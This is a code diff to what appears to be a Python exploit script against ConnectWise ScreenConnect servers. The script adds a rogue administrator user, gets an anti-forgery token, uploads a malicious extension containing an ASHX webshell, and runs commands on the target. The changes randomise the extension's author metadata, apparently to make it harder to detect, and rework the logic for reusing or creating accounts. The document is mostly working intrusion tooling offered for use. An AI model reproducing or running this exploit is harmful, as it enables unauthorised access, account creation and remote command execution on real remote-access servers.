@@ -83,9 +83,9 @@ public class {payload_handler_class} : IHttpHandler
 <ExtensionManifest>
   <Version>1</Version>
   <Name>{rand_text_alpha_lower(8)}</Name>
-  <Author>ConnectWise Labs</Author>
+  <Author>{rand_text_alpha_lower(8)}</Author>
   <ShortDescription>{rand_text_alpha_lower(8)}</ShortDescription>
-  <AuthorKey>null</AuthorKey>
+  <LoadMessage>null</LoadMessage>
   <Components>
     <WebServiceReference SourceFile="{payload_ashx}"/>
   </Components>
@@ -132,7 +132,7 @@ def ExecuteCommand(url):
                 except Exception as err:
                     print("[-] Error in func <ExecuteCommand>, error message: " + str(err))
         else:
-            print(f"[-] Malicious extension upload failed ({url + f'/App_Extensions/{plugin_guid}/{payload_ashx}'}), the target may have EDR/AV! Please upload ashx webshell yourself!")
+            print(f"[-] Malicious extension load error ({url + f'/App_Extensions/{plugin_guid}/{payload_ashx}'}), Refer to https://www.connectwise.com/globalassets/media/documents/connectwisecontrolsecurityevaluationmatrix.pdf")
             DeleteExtension(target, plugin_guid)
     except Exception as err:
         print("[-] Error in func <ExecuteCommand>, error message: " + str(err))
@@ -189,7 +189,6 @@ def AddUser(url, username, password, domain):
             print("[-] Error in func <AddUser>, error message: " + str(err))
 
 def CheckVersion(url):
-    print(f"[*] Start checking: {url}")
     try:
         response = requests.get(url=url + "/Login?Reason=0", headers=exploit_header, verify=False)
         serverString = response.headers["Server"]
@@ -231,13 +230,20 @@ if __name__ == "__main__":
         proxy = {"http": args.proxy, "https": args.proxy}
     else:
         proxy = {}
-    AddUser(target, username, password, domain)
+    print(f"[*] Start checking: {target}")
     anti_forgery_token = GetAntiForgeryToken(target, username, password)
+    if anti_forgery_token is None:
+        AddUser(target, username, password, domain)
+        anti_forgery_token = GetAntiForgeryToken(target, username, password)
+    else:
+        print(f"[+] username: {GREEN}{username}{RESET} | password: {GREEN}{password}{RESET}")
+
     CreateExtension()
     if anti_forgery_token is not None:
         print(f"[+] X-Anti-Forgery-Token successfully obtained: {anti_forgery_token}")
         UploadExtension(target, anti_forgery_token)
     else:
+
         print("[-] AntiForgeryToken acquisition failed, please check the network and try again or try to exploit manually")
     try:
         ExecuteCommand(target)
